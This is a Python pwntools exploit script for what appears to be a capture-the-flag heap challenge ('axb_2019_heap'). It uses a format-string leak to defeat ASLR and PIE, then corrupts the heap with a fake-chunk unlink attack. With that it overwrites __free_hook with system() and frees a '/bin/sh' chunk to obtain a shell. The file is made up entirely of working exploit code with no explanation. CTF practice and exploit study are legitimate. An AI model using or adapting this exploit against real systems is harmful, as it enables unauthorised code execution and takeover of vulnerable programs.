
#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
#context.log_level = 'debug'
#gdb.attach(p)
#pause()

# unlink
p = process('./axb_2019_heap')
elf = ELF('./axb_2019_heap')
libc =ELF('/root/libcbase/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6')

def pr(a,addr):
    log.success(a+': '+hex(addr))

def add(index,size,con):
    p.recvuntil('>> ')
    p.sendline(str(1))
    p.recvuntil('(0-10):')
    p.sendline(str(index))
    p.recvuntil('size:\n')
    p.sendline(str(size))
    p.recvuntil('content: \n')
    p.sendline(con)
    p.recvline()

def delete(index):
    p.recvuntil('>> ')
    p.sendline(str(2))
    p.recvuntil('index:\n')
    p.sendline(str(index))
    p.recvline()


def edit(index,content):
    p.recvuntil('>> ')
    p.sendline(str(4))
    p.recvuntil('index:\n')
    p.sendline(str(index))
    p.recvuntil('content: \n')
    p.sendline(content)
    p.recvline()


payload1 = '%15$p.%19$p'
p.sendlineafter('Enter your name: ',payload1)
p.recvuntil('Hello, ')
libcbase = int(p.recvuntil(".")[-13:-1],16) - 240 - libc.sym['__libc_start_main']
main_addr = int(p.recvuntil("\n")[-13:],16)
pie_base = main_addr-0x116a
system_addr = libcbase +libc.symbols["system"]
free_hook = libcbase +libc.symbols["__free_hook"]

pr('main_addr',main_addr)
pr('pie_base',pie_base)
pr('libcbase',libcbase)
pr('system_addr',system_addr)

pause()
#step2: fake_unlink
ptr = 0x202060 + pie_base

add(0, 0x98, p64(0)) #chunk0
add(1, 0x90, p64(1)) #chunk1
payload2 = p64(0) + p64(0x91) + p64(ptr-0x18) + p64(ptr-0x10) # fake chunk
payload2 += 'a'*0x70 + p64(0x90) + '\xa0'
edit(0, payload2)

delete(1) # unlink

payload3 = p64(0)*3 + p64(free_hook) + p64(0x38)
edit(0, payload3)
edit(0, p64(system_addr))
add(2, 0x88, '/bin/sh\x00')

p.recvuntil('>> ')
p.sendline(str(2))
p.recvuntil('index:\n')
p.sendline(str(2))

p.interactive()
